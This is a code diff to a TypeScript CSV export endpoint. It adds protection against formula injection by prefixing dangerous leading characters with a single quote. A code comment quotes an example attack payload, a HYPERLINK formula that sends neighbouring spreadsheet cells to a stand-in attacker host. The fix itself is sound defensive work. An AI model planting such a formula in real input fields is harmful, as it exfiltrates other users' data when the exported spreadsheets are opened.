@@ -84,7 +84,14 @@ export async function GET() {
     ];
     const escape = (v: unknown): string => {
       const s = v === null || v === undefined ? '' : String(v);
-      return `"${s.replace(/"/g, '""')}"`;
+      // Excel / Google Sheets treat cells that start with `=`, `+`,
+      // `-`, `@`, `\t`, `\r` as formulas — an attacker who registers
+      // with `name = =HYPERLINK("attacker.com/log?c="&A1, "coupon")`
+      // exfiltrates neighbouring rows when marketing opens the CSV.
+      // Prepending a single quote neutralizes the formula parse
+      // without visibly changing the value in the spreadsheet.
+      const guarded = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+      return `"${guarded.replace(/"/g, '""')}"`;
     };
     const lines = [header.map(escape).join(',')];
     for (const r of rows) {
